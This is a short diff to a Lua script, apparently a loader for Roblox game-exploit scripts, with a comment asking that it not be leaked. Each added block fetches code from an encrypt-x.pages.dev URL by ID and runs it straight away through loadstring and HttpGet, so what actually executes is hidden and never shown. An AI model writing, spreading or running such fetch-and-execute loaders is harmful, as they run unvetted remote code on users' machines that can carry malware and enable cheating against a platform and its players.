@@ -1,2 +1,7 @@
 -- Please Dont Leak, Making Script is really difficult.
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3138415405204"))("3138415405204")
+do
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=9787447947141"))("9787447947141")
+end
+do
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=3932922458988"))("3932922458988")
+end
